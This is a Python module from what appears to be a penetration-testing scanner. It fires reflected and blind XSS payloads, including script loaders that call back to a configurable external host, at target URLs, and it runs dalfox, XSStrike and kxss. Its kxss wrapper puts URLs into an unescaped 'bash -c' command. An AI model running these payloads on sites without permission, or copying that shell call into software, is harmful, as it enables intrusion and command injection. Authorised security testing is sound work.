"""
Phase 2 - Module 8a: XSS Detection Engine
Detects Reflected, Stored, DOM-based, and Blind XSS.
Multi-tool: dalfox, XSStrike, kxss — all stream live output.
"""
import asyncio
import httpx
import re
from typing import List, Dict, Optional
from urllib.parse import urlencode, urlparse, parse_qs, urljoin
from app.core.payload_manager import load_payloads
from app.core.verbose import run_tool_live, v_info, v_finding, v_tool

# Load XSS payloads — merges built-in defaults + any custom files in wordlists/custom/
_XSS_PAYLOADS = load_payloads("xss")

# Fallback hardcoded list if payload files are missing
_FALLBACK_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "'\"<script>alert(1)</script>",
    "javascript:alert(1)",
]

REFLECTED_PAYLOADS = _XSS_PAYLOADS if _XSS_PAYLOADS else _FALLBACK_PAYLOADS

# Blind XSS payload — calls back to your server
BLIND_XSS_TEMPLATE = """<script src="{callback}"></script>"""

DOM_SINKS = [
    "document.write", "document.writeln", "innerHTML", "outerHTML",
    "eval(", "setTimeout(", "setInterval(", "location.href",
    "location.replace", "window.open(", "document.URL",
]


class XSSEngine:
    def __init__(self, blind_xss_url: Optional[str] = None, timeout: int = 10):
        self.blind_xss_url = blind_xss_url
        self.timeout = timeout

    # ── Reflected XSS ──────────────────────────────────────────────────────

    async def test_reflected(self, url: str, params: List[str]) -> List[Dict]:
        """Inject payloads into GET parameters and check reflection."""
        findings = []
        parsed = urlparse(url)
        base_params = parse_qs(parsed.query)

        async with httpx.AsyncClient(verify=False, timeout=self.timeout, follow_redirects=True) as client:
            for param in params:
                for payload in REFLECTED_PAYLOADS:
                    test_params = {k: v[0] for k, v in base_params.items()}
                    test_params[param] = payload
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"
                    try:
                        resp = await client.get(test_url, headers={"User-Agent": "Mozilla/5.0"})
                        if payload.lower() in resp.text.lower():
                            finding = {
                                "type": "Reflected XSS",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "severity": "high",
                                "confidence": 0.85,
                                "evidence": f"Payload reflected in response body",
                                "suggested_next_step": "Confirm in browser and identify CSP headers",
                                "source": "king-internal",
                            }
                            v_finding("Reflected XSS", "high", test_url, f"param={param}")
                            findings.append(finding)
                            break  # Found for this param, move on
                    except Exception:
                        pass
        return findings

    # ── DOM XSS ────────────────────────────────────────────────────────────

    def detect_dom_sinks(self, js_content: str, source_url: str) -> List[Dict]:
        """Detect dangerous JS sinks in source code."""
        findings = []
        lines = js_content.split("\n")
        for i, line in enumerate(lines):
            for sink in DOM_SINKS:
                if sink in line:
                    # Check if user-controlled input flows into this sink
                    user_sources = ["location.", "document.URL", "window.location",
                                    "search", "hash", "href", "param"]
                    for src in user_sources:
                        if src in line:
                            findings.append({
                                "type": "DOM XSS (Potential)",
                                "url": source_url,
                                "sink": sink,
                                "line": i + 1,
                                "code_snippet": line.strip()[:200],
                                "severity": "high",
                                "confidence": 0.65,
                                "suggested_next_step": "Trace parameter flow in browser DevTools",
                                "source": "king-internal",
                            })
        return findings

    # ── Blind XSS ─────────────────────────────────────────────────────────

    async def inject_blind_xss(self, url: str, params: List[str]) -> List[Dict]:
        """Inject blind XSS payloads for OOB detection."""
        if not self.blind_xss_url:
            return []

        payloads = [
            BLIND_XSS_TEMPLATE.format(callback=self.blind_xss_url),
            f"'><script src=\"{self.blind_xss_url}\"></script>",
            f"\"><img src=x onerror=\"var s=document.createElement('script');s.src='{self.blind_xss_url}';document.head.appendChild(s)\">",
        ]

        findings = []
        parsed = urlparse(url)
        base_params = parse_qs(parsed.query)

        async with httpx.AsyncClient(verify=False, timeout=self.timeout) as client:
            for param in params:
                for payload in payloads:
                    test_params = {k: v[0] for k, v in base_params.items()}
                    test_params[param] = payload
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"
                    try:
                        await client.get(test_url)
                        findings.append({
                            "type": "Blind XSS (Injected)",
                            "url": test_url,
                            "parameter": param,
                            "payload": payload[:80],
                            "severity": "high",
                            "confidence": 0.5,
                            "suggested_next_step": f"Monitor {self.blind_xss_url} for callbacks",
                            "source": "king-internal",
                        })
                        break
                    except Exception:
                        pass
        return findings

    # ── Dalfox (External) ─────────────────────────────────────────────────

    async def run_dalfox(self, url: str) -> List[Dict]:
        """
        Run dalfox for XSS detection.
        Install: go install github.com/hahwul/dalfox/v2@latest
        """
        cmd = [
            "dalfox", "url", url,
            "--silence",
            "--no-color",
            "--format", "plain",
        ]
        if self.blind_xss_url:
            cmd += ["--blind", self.blind_xss_url]

        def parse_dalfox(line: str) -> Optional[str]:
            # dalfox outputs lines like: [V] Reflected XSS / [I] param ...
            if line.startswith("[V]") or line.startswith("[G]"):
                return line
            return None

        lines = await run_tool_live("dalfox", cmd, parse_fn=parse_dalfox, timeout=120)
        findings = []
        for line in lines:
            findings.append({
                "type": "XSS (dalfox)",
                "url": url,
                "severity": "high",
                "confidence": 0.90,
                "evidence": line,
                "suggested_next_step": "Verify in browser — dalfox confirms injection/reflection",
                "source": "dalfox",
            })
        return findings

    # ── XSStrike (External) ───────────────────────────────────────────────

    async def run_xsstrike(self, url: str) -> List[Dict]:
        """
        Run XSStrike for XSS detection.
        Install: git clone https://github.com/s0md3v/XSStrike && pip install -r requirements.txt
        """
        cmd = [
            "python3", "-m", "xsstrike",
            "--url", url,
            "--crawl",
            "--skip",
        ]

        def parse_xsstrike(line: str) -> Optional[str]:
            if any(kw in line.lower() for kw in ["xss", "payload", "vulnerable", "reflected"]):
                return line
            return None

        lines = await run_tool_live("XSStrike", cmd, parse_fn=parse_xsstrike, timeout=120)
        findings = []
        for line in lines:
            findings.append({
                "type": "XSS (XSStrike)",
                "url": url,
                "severity": "high",
                "confidence": 0.85,
                "evidence": line,
                "suggested_next_step": "Verify reported payload in browser",
                "source": "XSStrike",
            })
        return findings

    # ── kxss (External) ───────────────────────────────────────────────────

    async def run_kxss(self, url: str) -> List[Dict]:
        """
        Run kxss for reflected parameter detection.
        Install: go install github.com/Emoe/kxss@latest
        Usage: echo 'url' | kxss
        """
        # kxss reads URLs from stdin — pipe via echo
        cmd = ["bash", "-c", f"echo '{url}' | kxss"]

        def parse_kxss(line: str) -> Optional[str]:
            return line if line.strip() else None

        lines = await run_tool_live("kxss", cmd, parse_fn=parse_kxss, timeout=60)
        findings = []
        for line in lines:
            findings.append({
                "type": "XSS Reflection (kxss)",
                "url": url,
                "severity": "medium",
                "confidence": 0.70,
                "evidence": line,
                "suggested_next_step": "Parameter reflects special chars — attempt full XSS payload",
                "source": "kxss",
            })
        return findings

    # ── Full Scan ─────────────────────────────────────────────────────────

    async def scan(self, assets: List[Dict], js_findings: List[Dict] = None) -> List[Dict]:
        """
        Full XSS scan over crawled assets.
        Runs internal engine + dalfox + XSStrike + kxss in parallel.
        """
        all_findings = []
        internal_tasks = []

        for asset in assets:
            url = asset.get("url", "")
            params = asset.get("params") or self._extract_params(url)
            if params:
                internal_tasks.append(self.test_reflected(url, params))
                if self.blind_xss_url:
                    internal_tasks.append(self.inject_blind_xss(url, params))

        # Run internal engine
        results = await asyncio.gather(*internal_tasks)
        for r in results:
            all_findings.extend(r)

        # DOM sink analysis on JS
        for jf in (js_findings or []):
            if jf.get("content"):
                all_findings.extend(self.detect_dom_sinks(jf["content"], jf["url"]))

        # External tools on unique URLs (limit to top 20 to be respectful)
        unique_urls = list({a.get("url", "") for a in assets if a.get("url")})[:20]
        ext_tasks = []
        for url in unique_urls:
            ext_tasks.append(self.run_dalfox(url))
            ext_tasks.append(self.run_kxss(url))
            # XSStrike is slower — run only on top 5 URLs
        for url in unique_urls[:5]:
            ext_tasks.append(self.run_xsstrike(url))

        ext_results = await asyncio.gather(*ext_tasks)
        for r in ext_results:
            all_findings.extend(r)

        # Deduplicate by (url, evidence)
        seen = set()
        unique_findings = []
        for f in all_findings:
            key = (f.get("url", ""), f.get("evidence", "")[:60])
            if key not in seen:
                seen.add(key)
                unique_findings.append(f)

        return unique_findings

    def _extract_params(self, url: str) -> List[str]:
        parsed = urlparse(url)
        return list(parse_qs(parsed.query).keys())
